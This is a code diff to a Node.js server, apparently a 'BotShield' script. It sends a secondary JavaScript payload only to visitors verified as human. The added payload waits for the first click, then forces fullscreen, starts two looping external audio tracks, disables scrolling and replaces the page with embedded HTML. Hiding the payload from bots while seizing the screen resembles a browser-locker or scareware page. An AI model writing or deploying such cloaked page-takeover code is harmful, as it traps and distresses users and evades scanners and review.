@@ -226,9 +226,51 @@ function checkOrigin(req) {
 // ═══════════════════════════════════════════════════════════════
 //  SECONDARY CODE — returned only to verified humans
 // ═══════════════════════════════════════════════════════════════
+
+// Read the HTML file from the same directory as index.js
+let gameHtml = '';
+try {
+  gameHtml = fs.readFileSync(path.join(__dirname, 'full_screen_game.html'), 'utf8');
+  console.log('✅ Successfully loaded full_screen_game.html into memory');
+} catch (err) {
+  console.error('❌ Failed to load full_screen_game.html. Is it in the same directory?', err.message);
+}
+
+// Inject the HTML directly into the JS payload.
+// JSON.stringify() ensures the HTML string doesn't break the JS syntax.
 const SECONDARY_JS = `
-  console.log("%c✅ Human detected", "color:#0f0;font-size:18px;font-weight:bold");
-  console.log("[BotShield] Secondary payload executed at", new Date().toISOString());
+  console.log("%c✅ Human verified. Waiting for user interaction...", "color:#0f0;font-size:18px;font-weight:bold");
+
+  const embeddedHtml = ${JSON.stringify(gameHtml)};
+
+  window.addEventListener('click', function initGame() {
+    window.removeEventListener('click', initGame);
+
+    // 1. Request Full Screen
+    if (document.documentElement.requestFullscreen) {
+      document.documentElement.requestFullscreen().catch(err => {
+        console.warn('Fullscreen request denied:', err);
+      });
+    }
+
+    // 2. Play 2 looping audios
+    const audio1 = new Audio('https://audio.jukehost.co.uk/RTaK1bOF2dVBvCPxzqQZTVr2ScWfWnj9');
+    audio1.loop = true;
+    audio1.play().catch(e => console.warn('Audio 1 blocked:', e));
+
+    const audio2 = new Audio('https://audio.jukehost.co.uk/wuD65PsKBrAxWCZU4cJ2CbhUqwl33URw');
+    audio2.loop = true;
+    audio2.play().catch(e => console.warn('Audio 2 blocked:', e));
+
+    // 3. Disable scrolling
+    document.documentElement.style.overflow = 'hidden';
+    document.body.style.overflow = 'hidden';
+
+    // 4. Replace the DOM with the embedded HTML
+    document.open();
+    document.write(embeddedHtml);
+    document.close();
+  });
 `;
 
 // ═══════════════════════════════════════════════════════════════
